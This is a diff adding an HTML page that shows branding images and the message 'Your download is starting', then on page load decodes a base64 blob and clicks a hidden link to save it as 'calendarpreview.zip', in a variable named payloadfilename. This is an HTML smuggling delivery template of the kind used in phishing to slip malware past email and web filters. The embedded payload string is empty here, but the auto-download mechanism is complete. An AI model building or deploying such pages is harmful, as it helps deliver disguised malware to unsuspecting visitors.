@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        #logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        #logo img {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="logo"></div>
+
+    <script>
+        var img = document.createElement('img');
+        img.src = 'https://raw.githubusercontent.com/cncmusicfactory/favelaonblast/master/BuildingDC.png';
+        img.style.width = '300px';
+        img.style.height = 'auto';
+
+        var logoImg = document.createElement('img');
+        logoImg.src = 'https://raw.githubusercontent.com/cncmusicfactory/favelaonblast/master/logo.png';
+        logoImg.style.width = '100px';
+        logoImg.style.height = 'auto';
+        logoImg.style.alignSelf = 'center';
+
+        // Define your messages
+        var messageEl = document.createElement('p');
+        messageEl.innerHTML = "";
+        messageEl.style.textAlign = 'center';
+
+        var claimEl = document.createElement('p');
+        claimEl.innerHTML = "Your download is starting";
+        claimEl.style.textAlign = 'center';
+
+        var logoDiv = document.getElementById('logo');
+        logoDiv.style.display = 'flex';
+        logoDiv.style.flexDirection = 'column';
+        logoDiv.style.justifyContent = 'center';
+        logoDiv.style.alignItems = 'center';
+        logoDiv.style.gap = '20px';
+
+        // Append the elements in the correct order
+        logoDiv.appendChild(logoImg);
+        logoDiv.appendChild(messageEl);
+        logoDiv.appendChild(claimEl);
+        logoDiv.appendChild(img);        
+    </script>
+        <script>
+        window.onload = function() {
+            // Put your download script here
+            function b64toarray(base64) {
+                var bin_string = window.atob(base64);
+                var len = bin_string.length;  
+                var bytes = new Uint8Array(len);
+                for (var i = 0; i < len; i++) {
+                    bytes[i] = bin_string.charCodeAt(i);
+                }
+                return bytes.buffer;
+            }
+            var binary = '';
+        
+            var data = b64toarray(binary);
+            var blob = new Blob([data], {type: 'application/x-zip-compressed'});
+            var payloadfilename = 'calendarpreview.zip';
+        
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none'; 
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = payloadfilename;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        };
+            </script>
+</body>
+</html>
+
